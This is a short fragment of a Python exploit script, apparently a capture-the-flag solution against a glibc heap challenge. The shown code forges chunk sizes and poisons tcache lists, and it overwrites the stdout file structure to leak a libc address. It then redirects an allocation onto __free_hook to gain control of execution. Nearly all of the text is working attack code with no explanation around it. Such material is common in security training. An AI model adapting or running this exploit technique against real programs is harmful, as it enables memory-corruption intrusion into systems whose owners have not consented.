...
def exp(host, rce=False):
    ...
    new("0")
    new(p64(0x11)*8) #bypass check next_chunk->next_chunk->pre_size = next_chunk->size
    delete(1, 'y')
    delete(0, 'n')
    edit(0, p8(0x50))
    new("0") #1
    ...
    for i in range(7):
        delete(1, 'n')
    edit(2, p64(0) + p64(0x51)) #just 3 chunk,so free more
    delete(0, 'y')
    edit(2, p64(0) + p64(0x91))
    delete(1, 'y')
    edit(2, p64(0) + p64(0x51) + p16(0x7760))
    new("123") #0
    new(p64(0xfbad1800) + p64(0)*3 + p8(0)) #1
    r(8)
    libc_addr=uu64(r(6))
    if hex(libc_addr)[2:4] != '7f':
        raise Exception("address wrong")
    libc.address=libc_addr - 0x3ed8b0
    lg("libc",libc.address)
    delete(0, 'y')
    edit(2, p64(0) + p64(0x51) + p64(libc.sym['__free_hook']))
    new("0")
    edit(2, p64(0) + p64(0x71) + p64(libc.sym['__free_hook']))
    delete(0, 'y')
